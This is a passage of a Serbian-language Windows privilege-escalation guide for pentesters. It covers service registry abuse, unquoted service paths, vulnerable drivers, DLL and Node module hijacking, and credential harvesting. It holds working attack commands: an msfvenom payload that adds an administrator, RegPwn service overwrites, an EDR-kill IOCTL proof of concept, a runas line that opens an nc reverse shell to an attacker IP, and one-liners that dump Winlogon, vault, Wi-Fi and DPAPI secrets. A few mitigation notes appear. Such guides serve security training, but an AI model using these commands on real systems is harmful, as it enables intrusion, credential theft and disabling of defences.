4. SYSTEM upisuje vrednost koju je napadač izabrao na preusmerenu HKLM putanju.

Kada dobijete mogućnost proizvoljnog upisa vrednosti u HKLM, pređite na LPE prepisivanjem vrednosti konfiguracije servisa:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Izaberite servis koji normalan korisnik može da pokrene (npr. **`msiserver`**) i pokrenite ga nakon upisa. **Napomena:** javna exploit implementacija **zaključava radnu stanicu** kao deo race-a.

Primer alata (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

Ako imate ovu dozvolu nad registry-jem, to znači da **možete da kreirate pod-registry-je iz ovog registry-ja**. U slučaju Windows servisa, ovo je **dovoljno za izvršavanje proizvoljnog koda:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ako putanja do executable fajla nije navedena između navodnika, Windows će pokušati da izvrši svaki deo putanje koji se završava pre razmaka.

Na primer, za putanju _C:\Program Files\Some Folder\Service.exe_ Windows će pokušati da izvrši:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Izlistaj sve putanje servisa bez navodnika, izuzimajući one koje pripadaju ugrađenim Windows servisima:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Možete otkriti i iskoristiti** ovu ranjivost pomoću metasploit-a: `exploit/windows/local/trusted\_service\_path` Ručno možete kreirati binarni fajl servisa pomoću metasploit-a:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Akcije oporavka

Windows omogućava korisnicima da navedu akcije koje treba preduzeti ako usluga otkaže. Ova funkcija može biti konfigurisana tako da upućuje na binary. Ako je taj binary moguće zameniti, eskalacija privilegija može biti moguća. Više detalja možete pronaći u [zvaničnoj dokumentaciji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Aplikacije

### Instalirane aplikacije

Proverite **permissions binary-ja** (možda možete prepisati neki i eskalirati privilegije) i foldera ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Dozvole za pisanje

Proverite da li možete da izmenite neku konfiguracionu datoteku kako biste pročitali neku posebnu datoteku ili da li možete da izmenite neki binary koji će izvršiti Administrator nalog (schedtasks).

Jedan od načina da pronađete slabe dozvole nad folderima/datotekama u sistemu jeste:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Persistence/execution putem automatskog učitavanja Notepad++ plugin-a

Notepad++ automatski učitava svaki plugin DLL iz svojih podfoldera `plugins`. Ako postoji writable portable/copy instalacija, ubacivanje malicioznog plugin-a omogućava automatsko izvršavanje koda unutar `notepad++.exe` pri svakom pokretanju (uključujući izvršavanje iz `DllMain` i callback funkcija plugin-a).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Pokretanje pri startup-u

**Proverite da li možete da prepišete neki registry ključ ili binary koji će izvršiti drugi user.**\
**Pročitajte** **sledeću stranicu** da biste saznali više o zanimljivim **autoruns lokacijama za eskalaciju privilegija**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drajveri

Potražite moguće **neobične/ranjive drajvere trećih strana**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Ako driver izlaže proizvoljnu kernel read/write primitivu (što je uobičajeno kod loše dizajniranih IOCTL handlera), možete eskalirati privilegije direktnom krađom SYSTEM tokena iz kernel memorije.<sup>[[13]](#references)</sup> Pogledajte tehniku korak po korak ovde:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Kod bugova sa race-condition situacijama, gde ranjivi poziv otvara Object Manager putanju pod kontrolom napadača, namerno usporavanje pretrage (korišćenjem komponenti maksimalne dužine ili dubokih lanaca direktorijuma) može produžiti prozor sa nekoliko mikrosekundi na desetine mikrosekundi:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAFs, paged-pool disclosures i I/O ring pivoti

Neki Windows kernel LPE lanci mogu se izgraditi pomoću dva pojedinačno slaba buga: **cancel-safe queue lifetime race** koji oslobađa zahtev/CBD dok je queue lock još uvek zaključan, i **lock-release-before-copy** disclosure koji leak-uje oslobođenu paged-pool alokaciju tokom `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Napomene za audit i exploitation:

- **Free-under-lock + cancel afterwards**: tražite success putanju koja radi **Acquire -> CompleteRequest/free -> Release**, dok cancel putanja radi **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ako success putanja dođe do `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` pre otključavanja CBDQ/CSQ lock-a, thread blokiran u `NtCancelIoFileEx -> IopCsqCancelRoutine` može kasnije nastaviti izvršavanje i proslediti oslobođeni `PFLT_CALLBACK_DATA` nazad u remove callback drivera.
- **Reclaim freed queue object** pomoću paged-pool alokacije iste veličine pod kontrolom napadača. `NPFS` Data Queue Entries su korisni jer se payload i veličina mogu kontrolisati, a kasnije ih možete ispitati pomoću pipe read/peek operacija. Ako oslobođeni objekat sadrži list links, prepišite ih **cikličnom listom fake request nodes u user memoriji** kako bi driver iznova obrađivao request strukture definisane od strane napadača, umesto da se zaustavi na originalnom list head-u.
- **Upgrade a predictable write**: ako fake request preusmeri nested context pointer koji se koristi za bookkeeping writes (timestamps / QPC / refcount-adjacent fields), možete dobiti kernel write čija je adresa pod kontrolom, ali čija vrednost nije pod kontrolom. U tom slučaju ciljajte **length/size** field sprayed pool objekta umesto konačnog code/data pointer-a, a zatim enumerišite spray dok korumpirani objekat ne omogući **out-of-bounds paged-pool read**.
- **Raceable disclosure pattern**: svaki syscall koji radi `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` predstavlja snažnog kandidata. Pouzdanost se poboljšava kada napadač može da poveća kopirani buffer (na primer dodavanjem velikog broja list/resource entries koji povećavaju konačnu veličinu serializer alokacije), jer duže kopiranje proširuje window za zamenu bez nužnog rušenja sistema.
- **Pointer-rich refill targets**: Windows **I/O ring** registered-buffer arrays su odlične disclosure mete jer je njihova paged-pool veličina pod kontrolom napadača (`8 * regBufferCnt`), a svaki element je kernel pointer ka `_IOP_MC_BUFFER_ENTRY`. Leak-ujte jedan od ovih array-a, pronađite okolni `IORING_OBJECT`, a zatim korumpirajte **`RegBuffers`** i **`RegBuffersCount`** kako bi naknadne I/O ring operacije koristile forged entries pod kontrolom napadača i obezbedile proizvoljan kernel read/write. Ako jedini dostupni write upisuje stabilan bajt (na primer iz `KUSER_SHARED_DATA+0x14`), koristite **overlapping unaligned writes** da izgradite user pointer sa ponovljenim bajtom, kao što je `0x0101010101010101`, mapirajte ga pomoću `VirtualAlloc` i tamo smestite forged registered-buffer array.<sup>[[30]](#references)</sup>

Korisni indikatori za debugging:
```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```
Kada dobijete proizvoljni kernel read/write iz korumpiranog I/O ring-a, preuzmite SYSTEM token koristeći standardni post-primitive workflow:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives za korupciju memorije Registry hive-a

Savremene ranjivosti u hive-ovima omogućavaju kontrolisano oblikovanje memorije, zloupotrebu upisivih potomaka HKLM/HKU i pretvaranje korupcije metapodataka u prelivanja kernel paged pool-a bez prilagođenog drajvera. Celokupan lanac je opisan ovde:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direktni-mode type confusion iz putanja pod kontrolom napadača

Neki drajveri prihvataju putanju Registry-ja iz userland-a, proveravaju samo da li je to ispravan UTF-16 string, a zatim pozivaju `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` sa `RTL_QUERY_REGISTRY_DIRECT` u stack skalar, kao što je `int readValue`. Ako `RTL_QUERY_REGISTRY_TYPECHECK` nedostaje, `EntryContext` se tumači u skladu sa **stvarnim** tipom Registry-ja, a ne tipom koji je developer očekivao.

Ovo stvara dva korisna primitiva:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: apsolutna putanja `\Registry\...` pod kontrolom korisnika omogućava drajveru da upituje ključeve koje je izabrao napadač, otkrije njihovo postojanje preko povratnih kodova/logova i ponekad pročita vrednosti kojima caller ne bi mogao direktno da pristupi.
- **Korupcija kernel memorije**: odredište skalarnog tipa, kao što je `&readValue`, postaje type-confused kao `REG_QWORD`, `UNICODE_STRING` ili bafer binarnih podataka određene veličine, u zavisnosti od tipa vrednosti u Registry-ju.

Praktične napomene za exploitation:

- **Windows 8+ mitigacija**: ako upit dođe do **untrusted hive-a** sa `RTL_QUERY_REGISTRY_DIRECT`, ali bez `RTL_QUERY_REGISTRY_TYPECHECK`, kernel caller-i se ruše uz `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Da biste zadržali exploitability, tražite **ključeve kojima napadač može da upravlja unutar trusted system hive-ova**, umesto postavljanja vrednosti u `HKCU`.
- **Trusted-hive staging**: koristite NtObjectManager da nabrojite upisive potomke od `\Registry\Machine`, a zatim ponovite skeniranje sa dupliranim **low-integrity** tokenom da biste pronašli ključeve dostupne iz sandbox-ovanih konteksta:<sup>[[26]](#references)</sup>
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: direktan upis od 8 bajtova u 4-bajtni `int` oštećuje susedne podatke na steku i može delimično da prepiše obližnji callback/function pointer.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direktni režim očekuje da `EntryContext` pokazuje na `UNICODE_STRING`. Ako kod prvo učita napadačev `REG_DWORD` u skalarni podatak na steku, a zatim isti bafer ponovo upotrebi za čitanje stringa, napadač kontroliše `Length`/`MaximumLength` i delimično utiče na pokazivač `Buffer`, što dovodi do delimično kontrolisanog upisa u kernel.
- **`REG_BINARY`**: za velike binarne podatke, direktni režim tretira prvi `LONG` na adresi `EntryContext` kao veličinu bafera sa predznakom. Ako prethodno čitanje `REG_DWORD` ostavi negativnu vrednost koju kontroliše napadač u ponovo iskorišćenom skalarnom podatku, sledeći upit `REG_BINARY` direktno kopira bajtove napadača preko susednih slotova na steku, što je često najčistiji put do potpunog prepisivanja callback-pointera.

Snažan hunting obrazac: **heterogena čitanja iz registra u istu promenljivu na steku bez njene ponovne inicijalizacije**. Pretražite `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponovo korišćene pokazivače `EntryContext` i putanje koda u kojima prvo čitanje iz registra kontroliše da li će se izvršiti drugo čitanje.

#### Zloupotreba nedostatka FILE_DEVICE_SECURE_OPEN na device objektima (LPE + EDR kill)

Neki potpisani third-party driveri kreiraju svoj device objekat sa snažnim SDDL-om putem IoCreateDeviceSecure, ali zaborave da postave FILE_DEVICE_SECURE_OPEN u DeviceCharacteristics. Bez ove zastavice, secure DACL se ne primenjuje kada se device otvara kroz putanju koja sadrži dodatnu komponentu, što svakom neprivelegovanom korisniku omogućava da dobije handle korišćenjem namespace putanje kao što je:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (iz slučaja iz stvarnog sveta)

Kada korisnik može da otvori device, privilegovani IOCTL-ovi koje driver izlaže mogu se zloupotrebiti za LPE i tampering. Primeri mogućnosti zabeleženih u praksi:
- Vraćanje handle-ova sa punim pristupom proizvoljnim procesima (krađa tokena / SYSTEM shell putem DuplicateTokenEx/CreateProcessAsUser).
- Neograničeno čitanje/upis sirovog sadržaja diska (offline tampering, trikovi za persistence pri pokretanju sistema).
- Prekidanje proizvoljnih procesa, uključujući Protected Process/Light (PP/PPL), što omogućava AV/EDR kill iz user land-a putem kernela.

Minimalni PoC obrazac (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigacije za developere
- Uvek postavite FILE_DEVICE_SECURE_OPEN prilikom kreiranja objekata uređaja namenjenih ograničavanju putem DACL-a.
- Validirajte kontekst pozivaoca za privilegovane operacije. Dodajte PP/PPL provere pre dozvoljavanja terminiranja procesa ili vraćanja handle-ova.
- Ograničite IOCTL-ove (access masks, METHOD_*, validacija ulaza) i razmotrite brokered modele umesto direktnih kernel privilegija.

Ideje za detekciju za defendere
- Nadgledajte otvaranja sumnjivih naziva uređaja iz user-mode-a (npr. \\ .\\amsdk*) i specifične IOCTL sekvence koje ukazuju na abuse.
- Primenite Microsoft-ovu blocklistu ranjivih drivera (HVCI/WDAC/Smart App Control) i održavajte sopstvene allow/deny liste.


## PATH DLL Hijacking

Ako imate **write permissions unutar foldera koji se nalazi na PATH-u**, možda ćete moći da hijack-ujete DLL koji učitava proces i **escalate-ujete privilegije**.

Proverite permissions svih foldera unutar PATH-a:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Za više informacija o tome kako zloupotrebiti ovu proveru:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking putem `C:\node_modules`

Ovo je varijanta **Windows uncontrolled search path** problema koja utiče na **Node.js** i **Electron** aplikacije kada izvršavaju bare import kao što je `require("foo")`, a očekivani modul je **missing**.<sup>[[20]](#references)</sup>

Node razrešava pakete kretanjem kroz stablo direktorijuma i proveravanjem `node_modules` foldera u svakom nadređenom direktorijumu. Na Windowsu, to kretanje može stići do root direktorijuma diska, pa aplikacija pokrenuta iz `C:\Users\Administrator\project\app.js` može proveravati:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ako **low-privileged user** može da kreira `C:\node_modules`, može postaviti zlonamerni `foo.js` (ili package folder) i sačekati da **higher-privileged Node/Electron process** razreši missing dependency. Payload se izvršava u security context-u victim process-a, pa ovo postaje **LPE** kada target radi kao administrator, iz elevated scheduled task/service wrapper-a ili iz auto-started privileged desktop app-a.

Ovo je naročito često kada:

- je dependency deklarisan u `optionalDependencies`<sup>[[22]](#references)</sup>
- third-party library obavija `require("foo")` u `try/catch` i nastavlja nakon greške
- je package uklonjen iz production build-ova, izostavljen tokom packaging-a ili instalacija nije uspela
- se ranjivi `require()` nalazi duboko unutar dependency tree-a umesto u glavnom kodu aplikacije

### Pronalaženje ranjivih targeta

Koristite **Procmon** da dokažete resolution path:<sup>[[23]](#references)</sup>

- Filtrirajte prema `Process Name` = target executable (`node.exe`, Electron app EXE ili wrapper process)
- Filtrirajte prema `Path` `contains` `node_modules`
- Usredsredite se na `NAME NOT FOUND` i poslednje uspešno otvaranje pod `C:\node_modules`

Korisni obrasci za code review u raspakovanim `.asar` fajlovima ili source-u aplikacije:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Eksploatacija

1. Identifikujte **naziv paketa koji nedostaje** pomoću Procmon-a ili pregleda izvornog koda.
2. Kreirajte root direktorijum za pretragu ako već ne postoji:
```powershell
mkdir C:\node_modules
```
3. Ubaci modul sa tačno očekivanim nazivom:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Pokrenite aplikaciju žrtve. Ako aplikacija pokuša `require("foo")`, a legitimni modul ne postoji, Node može učitati `C:\node_modules\foo.js`.

Stvarni primeri nedostajućih opcionalnih modula koji odgovaraju ovom obrascu uključuju `bluebird` i `utf-8-validate`, ali je **technique** deo koji se može ponovo koristiti: pronađite bilo koji **missing bare import** koji će privilegovani Windows Node/Electron proces razrešiti.

### Ideje za detekciju i hardening

- Generišite upozorenje kada korisnik kreira `C:\node_modules` ili tamo upisuje nove `.js` fajlove/pakete.
- Tražite procese visokog integriteta koji čitaju iz `C:\node_modules\*`.
- U produkciji uključite sve runtime dependencies i proverite upotrebu `optionalDependencies`.
- Pregledajte kod trećih strana u potrazi za obrascima poput `try { require("...") } catch {}` koji se izvršavaju bez obaveštenja.
- Onemogućite opcionalne probe kada ih biblioteka podržava (na primer, neke `ws` deployment konfiguracije mogu izbeći legacy `utf-8-validate` probu pomoću `WS_NO_UTF_8_VALIDATE=1`).

## Mreža

### Deljeni resursi
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Proverite da li su u hosts file-u hardkodirani drugi poznati računari
```
type C:\Windows\System32\drivers\etc\hosts
```
### Mrežni interfejsi i DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Otvoreni portovi

Proverite **ograničene servise** spolja
```bash
netstat -ano #Opened ports?
```
### Tabela rutiranja
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP tabela
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Pravila Firewall-a

[**Pogledajte ovu stranicu za komande povezane sa Firewall-om**](../basic-cmd-for-pentesters.md#firewall) **(izlistavanje pravila, kreiranje pravila, isključivanje, isključivanje...)**

Više [komandi za network enumeration ovde](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binarni `bash.exe` se takođe može pronaći na lokaciji `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ako dobijete root korisnika, možete slušati na bilo kom portu (kada prvi put upotrebite `nc.exe` za slušanje na portu, putem GUI-ja će biti zatraženo da li `nc` treba dozvoliti kroz firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Da biste lako pokrenuli bash kao root, možete pokušati sa `--default-user root`

Možete istražiti `WSL` filesystem u folderu `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows kredencijali

### Winlogon kredencijali
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Menadžer kredencijala / Windows Vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault čuva korisničke kredencijale za servere, veb-sajtove i druge programe u koje **Windows** može **automatski prijavljivati korisnike**. Na prvi pogled može izgledati da korisnici sada mogu da čuvaju svoje Facebook kredencijale, Twitter kredencijale, Gmail kredencijale itd., kako bi se automatski prijavljivali putem browsera. Međutim, nije tako.

Windows Vault čuva kredencijale pomoću kojih Windows može automatski da prijavi korisnike, što znači da **bilo koja Windows aplikacija kojoj su potrebni kredencijali za pristup resursu** (serveru ili veb-sajtu) **može da koristi ovaj Credential Manager** & Windows Vault i da koristi dostavljene kredencijale, umesto da korisnici svaki put unose korisničko ime i lozinku.

Osim ako aplikacije ne komuniciraju sa Credential Managerom, ne verujem da mogu da koriste kredencijale za dati resurs. Dakle, ako vaša aplikacija želi da koristi vault, trebalo bi na neki način da **komunicira sa credential managerom i zatraži kredencijale za taj resurs** iz podrazumevanog storage vaulta.

Koristite `cmdkey` da izlistate sačuvane kredencijale na mašini.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Zatim možete koristiti `runas` sa opcijom `/savecred` da biste koristili sačuvane akreditive. Sledeći primer poziva udaljeni binarni fajl putem SMB share-a.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Korišćenje `runas` sa datim akreditivima.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Imajte na umu da se mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) ili [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) takođe mogu koristiti.

### UWP PasswordVault / Credential Locker

Moderne Windows UWP aplikacije, Microsoft Edge i moderne sistemske usluge čuvaju authentication tokene i lozinke u otvorenom tekstu unutar Universal Windows Platform (UWP) `PasswordVault` skladišta (takođe dostupnog kao `Web Credentials` u `vaultcmd`). Ovaj prostor za skladištenje je izolovan po sesiji i može se nativno dešifrovati bez administratorskih prava ili prava `SeDebugPrivilege`.

Izvršite ovu PowerShell komandu unutar aktivne sesije korisnika da biste odmah izlistali i dešifrovali sva sačuvana korisnička imena i lozinke u otvorenom tekstu:
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

**Data Protection API (DPAPI)** pruža metod za simetrično šifrovanje podataka, koji se pretežno koristi unutar Windows operativnog sistema za simetrično šifrovanje asimetričnih privatnih ključeva. Ovo šifrovanje koristi korisničku ili sistemsku tajnu kao značajan doprinos entropiji.

**DPAPI omogućava šifrovanje ključeva pomoću simetričnog ključa koji se izvodi iz korisničkih podataka za prijavljivanje**. U scenarijima koji uključuju sistemsko šifrovanje, koristi tajne sistema za autentikaciju na domenu.

Šifrovani korisnički RSA ključevi, korišćenjem DPAPI-ja, čuvaju se u direktorijumu `%APPDATA%\Microsoft\Protect\{SID}`, gde `{SID}` predstavlja korisnikov [identifikator bezbednosti](https://en.wikipedia.org/wiki/Security_Identifier). **DPAPI ključ, koji se nalazi zajedno sa master ključem koji štiti korisnikove privatne ključeve u istoj datoteci**, obično se sastoji od 64 bajta nasumičnih podataka. (Važno je napomenuti da je pristup ovom direktorijumu ograničen, što onemogućava izlistavanje njegovog sadržaja pomoću komande `dir` u CMD-u, iako se sadržaj može izlistati kroz PowerShell.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Možete koristiti **mimikatz module** `dpapi::masterkey` sa odgovarajućim argumentima (`/pvk` ili `/rpc`) da biste ga dešifrovali.

**Fajlovi sa kredencijalima zaštićeni glavnom lozinkom** obično se nalaze na:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Možete koristiti **mimikatz module** `dpapi::cred` sa odgovarajućim `/masterkey` za dešifrovanje.\
Možete **izvući mnoge DPAPI** **masterkeys** iz **memorije** pomoću modula `sekurlsa::dpapi` (ako imate root privilegije).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** se često koriste za **scripting** i zadatke automatizacije kao način za praktično čuvanje šifrovanih credentials. Credentials su zaštićeni pomoću **DPAPI**, što obično znači da ih može dešifrovati samo isti korisnik na istom računaru na kojem su kreirani.

Da biste **dešifrovali** PS credentials iz fajla koji ih sadrži, možete uraditi sledeće:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### WiFi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Sačuvane RDP veze

Možete ih pronaći na `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
i u `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Nedavno pokrenute komande
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Menadžer akreditiva udaljene radne površine**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Koristite **Mimikatz** modul `dpapi::rdg` sa odgovarajućim `/masterkey` da biste **dešifrovali sve .rdg datoteke**\
Možete **izvući veliki broj DPAPI masterkeys** iz memorije pomoću Mimikatz modula `sekurlsa::dpapi`

### Sticky Notes

Korisnici često koriste aplikaciju Sticky Notes na Windows radnim stanicama da **sačuvaju lozinke** i druge informacije, ne shvatajući da je u pitanju datoteka baze podataka. Ova datoteka se nalazi na lokaciji `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i uvek vredi pretražiti je i ispitati.

### AppCmd.exe

